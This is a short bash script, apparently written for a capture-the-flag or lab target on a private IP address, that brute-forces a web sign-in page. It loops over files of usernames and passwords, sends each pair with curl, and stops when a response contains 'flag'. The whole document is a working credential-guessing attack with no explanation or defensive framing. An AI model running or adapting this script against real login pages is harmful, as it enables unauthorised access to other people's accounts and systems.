#!/usr/bin/bash

IP=192.168.1.221
while read password; do
	while read username; do
        echo "http://$IP/index.php?page=signin&username=$username&password=$password&Login=Login#"
        curl -X POST "http://$IP/index.php?page=signin&username=$username&password=$password&Login=Login#" | grep 'flag' && exit 0 || continue
    done < 'usernames.txt'
done < 'passwords.txt'
